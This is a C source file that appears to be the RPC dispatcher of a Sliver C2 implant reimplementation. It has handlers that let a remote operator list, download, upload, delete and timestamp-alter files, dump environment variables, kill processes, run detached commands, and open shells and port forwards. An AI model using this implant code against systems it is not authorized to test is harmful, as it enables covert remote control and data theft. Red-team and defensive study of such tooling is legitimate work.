/* src/rpc/dispatch.c - handler table and the first slice of Sliver RPCs. */
#include "sliver/rpc.h"

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "sliver/fs.h"
#include "sliver/log.h"
#include "sliver/platform.h"
#include "sliver/proc.h"

#define SLIVER_LS_MAX_ENTRIES 4096

typedef int (*rpc_handler_fn)(const sliver_envelope_t *req, sliver_buf_t *out);

typedef struct {
  uint32_t req_type;
  uint32_t resp_type;
  rpc_handler_fn fn;
} rpc_entry_t;

/* --- Ls ---------------------------------------------------------------- */
typedef struct {
  sliver_file_info_t *files;
  size_t count;
  size_t cap;
  int overflow;
} ls_ctx_t;

static int ls_collect(const sliver_dir_entry_t *entry, void *ctx) {
  ls_ctx_t *c = (ls_ctx_t *)ctx;
  sliver_file_info_t *slot;

  if (c->count >= c->cap) {
    c->overflow = 1;
    return 1; /* stop iterating */
  }
  slot = &c->files[c->count++];
  memset(slot, 0, sizeof(*slot));
  (void)strncpy(slot->name, entry->name, sizeof(slot->name) - 1);
  slot->is_dir = entry->is_dir;
  slot->size = entry->size;
  slot->mtime = entry->mtime;
  (void)strncpy(slot->mode, entry->mode, sizeof(slot->mode) - 1);
  (void)strncpy(slot->link, entry->link, sizeof(slot->link) - 1);
  return 0;
}

int sliver_rpc_handle_ls(const sliver_envelope_t *req, sliver_buf_t *out) {
  char path[1024];
  char cwd[1024];
  char absolute[1024];
  ls_ctx_t ctx;
  int exists;
  int rc;

  if (sliver_ls_req_decode(req->data, req->data_len, path, sizeof(path)) != 0) {
    return -1;
  }
  if (path[0] == '\0') {
    if (sliver_fs_getcwd(cwd, sizeof(cwd)) != 0) {
      return -1;
    }
    (void)strncpy(path, cwd, sizeof(path) - 1);
    path[sizeof(path) - 1] = '\0';
  }
  exists = sliver_fs_exists(path);

  ctx.files = (sliver_file_info_t *)calloc(SLIVER_LS_MAX_ENTRIES, sizeof(sliver_file_info_t));
  ctx.count = 0;
  ctx.cap = SLIVER_LS_MAX_ENTRIES;
  ctx.overflow = 0;
  if (ctx.files == NULL) {
    return -1;
  }
  if (exists) {
    (void)sliver_fs_list(path, ls_collect, &ctx);
  }
  if (ctx.overflow) {
    LOG_WARN("rpc: ls truncated at %d entries", SLIVER_LS_MAX_ENTRIES);
  }

  /* Report the absolute path back, like the Go implant does. */
  if (sliver_fs_abspath(path, absolute, sizeof(absolute)) != 0) {
    (void)strncpy(absolute, path, sizeof(absolute) - 1);
    absolute[sizeof(absolute) - 1] = '\0';
  }
  rc = sliver_ls_encode(out, absolute, exists, ctx.files, ctx.count);
  free(ctx.files);
  return rc;
}

/* --- Pwd --------------------------------------------------------------- */
int sliver_rpc_handle_pwd(const sliver_envelope_t *req, sliver_buf_t *out) {
  char cwd[1024];
  (void)req;
  if (sliver_fs_getcwd(cwd, sizeof(cwd)) != 0) {
    return -1;
  }
  return sliver_pwd_encode(out, cwd, NULL);
}

/* --- Cd ---------------------------------------------------------------- */
int sliver_rpc_handle_cd(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_path_req_t p;
  char cwd[1024];
  char err[256];

  if (sliver_path_req_decode(req->data, req->data_len, &p) != 0) {
    return -1;
  }
  err[0] = '\0';
  if (sliver_fs_chdir(p.path) != 0) {
    (void)snprintf(err, sizeof(err), "chdir %s: failed", p.path);
  }
  if (sliver_fs_getcwd(cwd, sizeof(cwd)) != 0) {
    (void)snprintf(cwd, sizeof(cwd), "%s", p.path);
  }
  LOG_DEBUG("rpc: cd '%s' -> %s", p.path, cwd);
  return sliver_pwd_encode(out, cwd, err);
}

/* --- Rm ---------------------------------------------------------------- */
int sliver_rpc_handle_rm(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_path_req_t p;
  char err[256];

  if (sliver_path_req_decode(req->data, req->data_len, &p) != 0) {
    return -1;
  }
  err[0] = '\0';
  if (sliver_fs_remove(p.path, p.recursive, p.force) != 0) {
    (void)snprintf(err, sizeof(err), "rm %s: failed", p.path);
  }
  return sliver_path_resp_encode(out, p.path, err);
}

/* --- Mkdir ------------------------------------------------------------- */
int sliver_rpc_handle_mkdir(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_path_req_t p;
  char err[256];

  if (sliver_path_req_decode(req->data, req->data_len, &p) != 0) {
    return -1;
  }
  err[0] = '\0';
  if (sliver_fs_mkdir(p.path) != 0) {
    (void)snprintf(err, sizeof(err), "mkdir %s: failed", p.path);
  }
  return sliver_path_resp_encode(out, p.path, err);
}

/* --- Ps ---------------------------------------------------------------- */
int sliver_rpc_handle_ps(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_proc_t *procs = NULL;
  sliver_proc_info_t *infos = NULL;
  size_t count = 0;
  size_t i;
  int rc;

  (void)req;
  if (sliver_proc_list(&procs, &count) != 0) {
    return sliver_ps_encode(out, NULL, 0, "ps: cannot enumerate processes");
  }
  infos = (sliver_proc_info_t *)calloc(count == 0 ? 1 : count, sizeof(sliver_proc_info_t));
  if (infos == NULL) {
    sliver_proc_free(procs);
    return -1;
  }
  for (i = 0; i < count; ++i) {
    infos[i].pid = procs[i].pid;
    infos[i].ppid = procs[i].ppid;
    infos[i].exe = procs[i].exe;
    infos[i].owner = procs[i].owner;
    infos[i].session_id = procs[i].session_id;
    infos[i].cmdline = procs[i].cmdline;
    infos[i].arch = procs[i].arch;
  }
  rc = sliver_ps_encode(out, infos, count, NULL);
  free(infos);
  sliver_proc_free(procs);
  return rc;
}

/* --- Terminate --------------------------------------------------------- */
int sliver_rpc_handle_terminate(const sliver_envelope_t *req, sliver_buf_t *out) {
  int32_t pid = 0;
  int force = 0;
  char err[128];

  if (sliver_terminate_req_decode(req->data, req->data_len, &pid, &force) != 0) {
    return -1;
  }
  err[0] = '\0';
  if (sliver_proc_terminate(pid, force) != 0) {
    (void)snprintf(err, sizeof(err), "terminate %d: failed", (int)pid);
  }
  return sliver_terminate_encode(out, pid, err);
}

/* --- Env --------------------------------------------------------------- */
int sliver_rpc_handle_env(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_env_t *vars = NULL;
  sliver_env_pair_t *pairs = NULL;
  size_t count = 0;
  size_t i;
  int rc;

  (void)req;
  if (sliver_env_list(&vars, &count) != 0) {
    return sliver_env_encode(out, NULL, 0, "env: cannot read environment");
  }
  pairs = (sliver_env_pair_t *)calloc(count == 0 ? 1 : count, sizeof(sliver_env_pair_t));
  if (pairs == NULL) {
    sliver_env_free(vars);
    return -1;
  }
  for (i = 0; i < count; ++i) {
    pairs[i].key = vars[i].key;
    pairs[i].value = vars[i].value;
  }
  rc = sliver_env_encode(out, pairs, count, NULL);
  free(pairs);
  sliver_env_free(vars);
  return rc;
}

/* --- Download ---------------------------------------------------------- */
int sliver_rpc_handle_download(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_download_req_t dl;
  sliver_buf_t chunk;
  int64_t limit = SLIVER_DOWNLOAD_CHUNK;
  int64_t stop = 0;
  int exists;
  int is_dir = 0;
  int rc;

  sliver_buf_init(&chunk);
  if (sliver_download_req_decode(req->data, req->data_len, &dl) != 0) {
    return -1;
  }
  if (dl.start < 0) {
    return sliver_download_encode(out, dl.path, 0, 0, 0, NULL, 0, 0,
                                  "download: negative offset");
  }
  exists = sliver_fs_exists(dl.path);
  is_dir = sliver_fs_is_dir(dl.path);
  if (exists && !is_dir) {
    if (dl.stop > dl.start && dl.stop - dl.start < limit) {
      limit = dl.stop - dl.start;
    }
    /* Honour MaxBytes (e.g. `head -c` style requests). */
    if (dl.max_bytes > 0 && dl.max_bytes < limit) {
      limit = dl.max_bytes;
    }
    (void)sliver_fs_read_chunk(dl.path, dl.start, limit, &chunk);
    stop = dl.start + (int64_t)chunk.len;
  } else {
    stop = dl.start;
  }
  rc = sliver_download_encode(out, dl.path, exists, dl.start, stop, chunk.data, chunk.len, is_dir,
                              exists ? NULL : "download: no such file");
  sliver_buf_free(&chunk);
  return rc;
}

/* --- Upload ------------------------------------------------------------ */
int sliver_rpc_handle_upload(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_upload_req_t up;
  char err[256];
  int ok;

  if (sliver_upload_req_decode(req->data, req->data_len, &up) != 0) {
    return -1;
  }
  err[0] = '\0';
  ok = sliver_fs_write_chunk(up.path, up.data, up.data_len, up.overwrite) == 0;
  if (!ok) {
    (void)snprintf(err, sizeof(err), "upload %s: write failed (errno %d, len %u)", up.path,
                   errno, (unsigned)up.data_len);
  }
  return sliver_upload_encode(out, up.path, ok ? 1 : 0, ok ? 0 : 1, err);
}

/* --- Execute ----------------------------------------------------------- */
typedef struct {
  char path[1024];
  char args[SLIVER_EXEC_MAX_ARGS][512];
  size_t argc;
  int output;
  int background;
  int64_t envelope_id;
} exec_job_t;

static sliver_rpc_send_fn g_rpc_send = NULL;

void sliver_rpc_set_sender(sliver_rpc_send_fn fn) { g_rpc_send = fn; }

static void execute_worker(void *arg) {
  exec_job_t *job = (exec_job_t *)arg;
  const char *argv[SLIVER_EXEC_MAX_ARGS];
  sliver_buf_t out_buf;
  sliver_buf_t err_buf;
  sliver_buf_t msg;
  uint32_t pid = 0;
  uint32_t status = 0;
  size_t i;

  for (i = 0; i < job->argc; ++i) {
    argv[i] = job->args[i];
  }
  sliver_buf_init(&out_buf);
  sliver_buf_init(&err_buf);
  {
    const char *start_err = NULL;
    if (job->background) {
      /* Background: report the pid and return immediately, the child lives on. */
      sliver_child_t *child = NULL;
      if (sliver_child_spawn(job->path, argv, job->argc, &child, &pid) == 0) {
        /* The child runs detached; close stdin so it does not block. */
        sliver_child_close_stdin(child);
        sliver_child_free(child);
      } else {
        status = 1;
        start_err = "execute: cannot start process";
      }
    } else if (sliver_proc_exec(job->path, argv, job->argc, job->output, &out_buf, &err_buf,
                                &pid, &status) != 0) {
      /* Only a failure to *start* the child is an error: a non-zero exit code is
       * reported through Status like the Go implant does. */
      status = 1;
      start_err = "execute: cannot start process";
    }
    sliver_buf_init(&msg);
    if (sliver_execute_encode(&msg, status, out_buf.data, out_buf.len, err_buf.data,
                              err_buf.len, pid, start_err) == 0) {
      if (g_rpc_send != NULL) {
        (void)g_rpc_send(job->envelope_id, SLIVER_MSG_EXECUTE_REQ, msg.data, msg.len);
      }
    }
  }
  sliver_buf_free(&msg);
  sliver_buf_free(&out_buf);
  sliver_buf_free(&err_buf);
  free(job);
}

int sliver_rpc_execute_async(const sliver_envelope_t *req) {
  sliver_execute_req_t ex;
  exec_job_t *job;
  sliver_thread_t *thread;

  if (sliver_execute_req_decode(req->data, req->data_len, &ex) != 0) {
    return -1;
  }
  job = (exec_job_t *)calloc(1, sizeof(*job));
  if (job == NULL) {
    return -1;
  }
  (void)snprintf(job->path, sizeof(job->path), "%s", ex.path);
  job->argc = ex.argc;
  for (size_t i = 0; i < ex.argc; ++i) {
    (void)snprintf(job->args[i], sizeof(job->args[i]), "%s", ex.args[i]);
  }
  job->output = ex.output;
  job->background = ex.background;
  job->envelope_id = req->id;
  thread = sliver_thread_create(execute_worker, job);
  if (thread == NULL) {
    free(job);
    return -1;
  }
  sliver_thread_detach(thread); /* fire and forget: the worker frees its job */
  return 0;
}

static int sliver_rpc_handle_execute_async_entry(const sliver_envelope_t *req,
                                                sliver_buf_t *out) {
  (void)out;
  if (sliver_rpc_execute_async(req) != 0) {
    return -1;
  }
  return -2; /* the worker thread answers with the request envelope id */
}

/* --- Whoami (Windows CurrentTokenOwner) -------------------------------- */
int sliver_rpc_handle_token_owner(const sliver_envelope_t *req, sliver_buf_t *out) {
  char user[256];
  (void)req;
  user[0] = 0;
  if (sliver_username(user, sizeof(user)) != 0) {
    (void)snprintf(user, sizeof(user), "%s", "unknown");
  }
  return sliver_current_token_owner_encode(out, user);
}

/* --- Cp / Mv / Chmod / Chtimes ----------------------------------------- */
static int handle_cp_entry(const sliver_envelope_t *req, sliver_buf_t *out) {
  char src[1024];
  char dst[1024];
  int64_t written = 0;
  char err[256];

  if (sliver_src_dst_decode(req->data, req->data_len, src, sizeof(src), dst, sizeof(dst)) != 0) {
    return -1;
  }
  err[0] = 0;
  if (src[0] == 0 || dst[0] == 0) {
    (void)snprintf(err, sizeof(err), "%s", "cp: missing src or dst");
  } else if (sliver_fs_copy(src, dst, &written) != 0) {
    (void)snprintf(err, sizeof(err), "cp %s -> %s: failed", src, dst);
  }
  LOG_DEBUG("rpc: cp %s -> %s (%lld bytes)", src, dst, (long long)written);
  return sliver_cp_encode(out, src, dst, written, err);
}

static int handle_mv_entry(const sliver_envelope_t *req, sliver_buf_t *out) {
  char src[1024];
  char dst[1024];
  char err[256];

  if (sliver_src_dst_decode(req->data, req->data_len, src, sizeof(src), dst, sizeof(dst)) != 0) {
    return -1;
  }
  err[0] = 0;
  if (src[0] == 0 || dst[0] == 0) {
    (void)snprintf(err, sizeof(err), "%s", "mv: missing src or dst");
  } else if (sliver_fs_move(src, dst) != 0) {
    (void)snprintf(err, sizeof(err), "mv %s -> %s: failed", src, dst);
  }
  LOG_DEBUG("rpc: mv %s -> %s", src, dst);
  return sliver_mv_encode(out, src, dst, err);
}

static int handle_chmod_entry(const sliver_envelope_t *req, sliver_buf_t *out) {
  char path[1024];
  char mode[32];
  int recursive = 0;
  char err[256];

  if (sliver_chmod_req_decode(req->data, req->data_len, path, sizeof(path), mode, sizeof(mode),
                              &recursive) != 0) {
    return -1;
  }
  err[0] = 0;
  if (sliver_fs_chmod(path, mode, recursive) != 0) {
    (void)snprintf(err, sizeof(err), "chmod %s %s: failed", path, mode);
  }
  return sliver_path_resp_encode(out, path, err);
}

static int handle_chtimes_entry(const sliver_envelope_t *req, sliver_buf_t *out) {
  char path[1024];
  int64_t atime = 0;
  int64_t mtime = 0;
  char err[256];

  if (sliver_chtimes_req_decode(req->data, req->data_len, path, sizeof(path), &atime, &mtime) != 0) {
    return -1;
  }
  err[0] = 0;
  if (sliver_fs_settimes(path, atime, mtime) != 0) {
    (void)snprintf(err, sizeof(err), "chtimes %s: failed", path);
  }
  return sliver_path_resp_encode(out, path, err);
}

/* --- table ------------------------------------------------------------- */
static const rpc_entry_t g_handlers[] = {
    {SLIVER_MSG_LS_REQ, SLIVER_MSG_LS, sliver_rpc_handle_ls},
    {SLIVER_MSG_PWD_REQ, SLIVER_MSG_PWD, sliver_rpc_handle_pwd},
    {SLIVER_MSG_CD_REQ, SLIVER_MSG_PWD, sliver_rpc_handle_cd},
    {SLIVER_MSG_RM_REQ, SLIVER_MSG_RM, sliver_rpc_handle_rm},
    {SLIVER_MSG_MKDIR_REQ, SLIVER_MSG_MKDIR, sliver_rpc_handle_mkdir},
    {SLIVER_MSG_PS_REQ, SLIVER_MSG_PS, sliver_rpc_handle_ps},
    {SLIVER_MSG_TERMINATE_REQ, SLIVER_MSG_TERMINATE, sliver_rpc_handle_terminate},
    {SLIVER_MSG_ENV_REQ, SLIVER_MSG_ENV, sliver_rpc_handle_env},
    {SLIVER_MSG_DOWNLOAD_REQ, SLIVER_MSG_DOWNLOAD, sliver_rpc_handle_download},
    {SLIVER_MSG_UPLOAD_REQ, SLIVER_MSG_UPLOAD, sliver_rpc_handle_upload},
    {SLIVER_MSG_EXECUTE_REQ, SLIVER_MSG_EXECUTE_REQ, sliver_rpc_handle_execute_async_entry},
    {SLIVER_MSG_SHELL_REQ, SLIVER_MSG_SHELL, sliver_rpc_handle_shell},
    {SLIVER_MSG_TUNNEL_DATA, 0, sliver_rpc_handle_tunnel_data},
    {SLIVER_MSG_TUNNEL_CLOSE, 0, sliver_rpc_handle_tunnel_close},
    {SLIVER_MSG_SHELL_RESIZE_REQ, 0, sliver_rpc_handle_shell_resize},
    {SLIVER_MSG_PORTFWD_REQ, SLIVER_MSG_PORTFWD, sliver_rpc_handle_portfwd},
    {SLIVER_MSG_CP_REQ, SLIVER_MSG_CP, handle_cp_entry},
    {SLIVER_MSG_MV_REQ, SLIVER_MSG_MV, handle_mv_entry},
    {SLIVER_MSG_CHMOD_REQ, SLIVER_MSG_CHMOD, handle_chmod_entry},
    {SLIVER_MSG_CHTIMES_REQ, SLIVER_MSG_CHTIMES, handle_chtimes_entry},
    {SLIVER_MSG_CURRENT_TOKEN_OWNER_REQ, SLIVER_MSG_CURRENT_TOKEN_OWNER,
     sliver_rpc_handle_token_owner},
};

void sliver_rpc_result_free(sliver_rpc_result_t *result) {
  if (result == NULL) {
    return;
  }
  sliver_buf_free(&result->message);
  result->handled = 0;
  result->no_response = 0;
  result->resp_type = 0;
}

void sliver_rpc_dispatch(const sliver_envelope_t *req, sliver_rpc_result_t *result) {
  size_t i;

  if (result == NULL) {
    return;
  }
  sliver_buf_init(&result->message);
  result->handled = 0;
  result->no_response = 0;
  result->resp_type = 0;
  if (req == NULL) {
    return;
  }
  for (i = 0; i < sizeof(g_handlers) / sizeof(g_handlers[0]); ++i) {
    if (g_handlers[i].req_type != req->type) {
      continue;
    }
    {
      int hrc = g_handlers[i].fn(req, &result->message);
      result->handled = 1;
      if (hrc == -2) {
        /* Handler replied (or deliberately stayed silent) itself. */
        result->no_response = 1;
        result->resp_type = 0;
        sliver_buf_free(&result->message);
        sliver_buf_init(&result->message);
      } else if (hrc == 0) {
        result->resp_type = g_handlers[i].resp_type;
      } else {
        /* Handler failed: let the peer see UnknownMessageType instead of an
         * empty (and meaningless) response of the expected type. */
        LOG_ERROR("rpc: handler for type %u failed", req->type);
        result->handled = 0;
        result->resp_type = 0;
        sliver_buf_free(&result->message);
        sliver_buf_init(&result->message);
      }
    }
    return;
  }
}













